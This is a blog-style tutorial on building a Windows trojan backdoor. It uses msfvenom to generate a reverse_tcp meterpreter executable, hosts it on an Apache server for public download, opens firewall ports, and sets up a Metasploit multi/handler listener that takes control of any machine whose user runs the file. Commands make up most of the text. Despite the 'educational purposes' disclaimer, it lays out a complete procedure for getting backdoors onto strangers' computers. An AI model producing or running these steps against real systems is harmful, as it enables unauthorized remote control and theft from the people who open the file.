---
title: "Creating a Trojan Backdoor with Reverse TCP Payload in Metasploit and Setting Up World-wide Access for Windows Machines"
date: 2021-06-27T18:07:30+0800
tags: ["Ethical-hacking", "Metasploit", "Trojan", "Backdoor", "Payload", "Hacking"]
lastmod: 2025-03-03T01:12:12+0800
---

## Introduction

Metasploit was pertty much a tool for testing exploits and vulnerabilities, but it can also be used to create backdoors and trojans. In this guide, we will create a trojan backdoor with a remote code execution (RCE) payload in Metasploit. We will also set up world-wide access to the backdoor program.

## Disclaimer

***This article is for educational purposes only. Please use this knowledge responsibly. Unauthorized access to systems is illegal and unethical. The methods here are used for legitimate recovery and testing, not for illegal activities.***

## Prerequisites

A brain and a computer. You bashould have a understanding of how to use the command line and Metasploit. ***Again, this guide is for educational purposes only. Scipt kiddies, please don't use this for illegal activities lmao.***

## Install Required Packages

Download and install the packages that optimize our process and make it easier to set up the server.

```
sudo apt update
sudo apt install curl ufw screen apache2 metasploit-framework --yes
```

## Setting Up World-wide Access

We will use `ufw` to set up the firewall. `ufw` is disabled by default, so we need to enable it. It will warn you that connections may be dropped, but you can ignore this and continue by typing `y`.

Enable `ufw`:
```bash
sudo ufw enable
```

### Allow Specific Ports

Using TCP Protocol, we will demonstrate with port 5555:

```bash
sudo ufw allow 5555/tcp
```

### Check Current IP Address

To generate the trojan, we need to know the current host's IP address. Use the following command to check:
```bash
curl ifconfig.me
```

Alternatively, use `hostname` to check:

```bash
hostname -i
```

Copy the IP address and proceed to the next step.

## Generate the Backdoor Program

We will use Metasploit's built-in program `msfvenom`.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=5555 -f exe > trojan.exe
```

- `LHOST`: Your Public IP Address
- `LPORT`: The port number you opened
- `trojan.exe`: The name of the generated file

## Create Download Link

To allow users to access your website and download the file, you can set up Apache or nginx, or use a simple Python server. To make our file management by yourself to ensure the file is not tampered with other web servers. So better to self-host the file :D

First, allow port 80:

```bash
sudo ufw allow 80
```

### Copy the Backdoor Program to the Web Server

use the `cp` command to copy the generated backdoor program to your web server. The web server path is:

```bash
/var/www/html
```

Copy the file to the directory:

```bash
cp -v trojan.exe /var/www/html/
```

Open a browser and enter your server's IP address to access the website. The successful page bashould look like this:

## Downlaod the File

Use a browser to enter your IP address and the file name to test the download. The successful page bashould look like this:

```
123.123.123.123/trojan.exe
```

## Metasploit Listener

After confirming the file can be downloaded, we need to use the `msfconsole` to set up the listener.

Open Metasploit:

```bash
msfconsole
```

### Use the Specified Module

Enter the following commands to create our listener of reverse TCP:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
```

### Set Payload Options

In the console, the program does not yet know the information about your backdoor program. We need to modify the configuration to let the console know where the exploit is.

Show current options:

```sh
show options
```

You will see two options that need to be modified: `LHOST` and `LPORT`. Set them to your public IP and the TCP port you opened.

Set the IP address:

```sh
set LHOST [IPV4_Address]
```

Set the port number:

```sh
set LPORT [Port_Number]
```

### Verify the Settings

Check the current settings:

```sh
show options
```

### Wait for the Backdoor Program to be Opened

Once everything is set, you can start listening for someone to open your backdoor program. When someone opens the file, your console will respond, and you will have successfully compromised the computer.

There are a few methods to start listening:

#### Method 1: `exploit`

This method does not allow you to work in the same window while waiting. You can stop the process by pressing `Ctrl+C`.

Start listening:

```sh
exploit
```

#### Method 2: `run`

This method allows you to continue working in the same window while waiting. You can stop the process by pressing `Ctrl+C`.

Start listening:

```sh
run
```

#### Method 3: `exploit -j -z`

This method allows you to continue working in the same window, but you need to manually enter the session.

Start listening:

```sh
exploit -j -z
```

When the target opens the file, your console will respond. You need to enter the session to control the system.

First, check the current sessions:

```sh
sessions
```

You will see an ID, for example, `1`. Use the `-i` option to enter the session:

```sh
sessions -i 1
```

## Conclusion

You have successfully created a trojan backdoor with a remote code execution payload in Metasploit. You can now access the target system and control it remotely. Remember to use this knowledge responsibly and legally. Unauthorized access to systems is illegal and unethical. The methods here are used for legitimate recovery and testing, not for illegal activities. Have fun hacking :)

### Do We Need to Learn Metasploit?

My answer is: it can be yes or no.

Metasploit is essentially a command-line interface (CLI) tool for testing exploits and vulnerabilities. However, if you are targeting a bug bounty program or working as a red team professional, Metasploit shoule be quite simple for you to use. Learning Metasploit is beneficial, but it is even more valuable to spend time learning how to write your own exploits and understand the underlying exploit code. Relying solely on pre-made tools like Metasploit may not be the best approach.

For example, understanding OWASP's Top 10 vulnerabilities, such as SQL injection (including error-based, UNION-based, and blind SQL injection), is crucial. It is better to invest time in learning these concepts rather than just using existing tools. This deeper understanding will make you a more effective and versatile security professional.
